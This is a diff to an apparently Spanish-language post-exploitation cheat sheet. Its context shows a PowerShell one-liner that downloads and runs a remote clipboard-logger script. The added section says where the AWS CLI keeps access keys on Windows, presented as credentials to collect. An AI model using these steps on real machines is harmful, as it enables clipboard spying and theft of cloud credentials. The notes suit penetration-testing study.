@@ -122,3 +122,11 @@ para esto podemos usar SessionGopher
 ### Obtener el clipboard
     IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
     Invoke-ClipboardLogger
+
+---
+
+### Obtener credenciales de AWS
+
+Cuando realizamos una autenticación en AWS utilizando el cli o el sdk se enera un conjunto de credenciales que incluyen un Access Key Id y un Secret Access Key. Suele uardarse en:
+
+    C:\Users\NombreDeUsuario\.aws\credentials
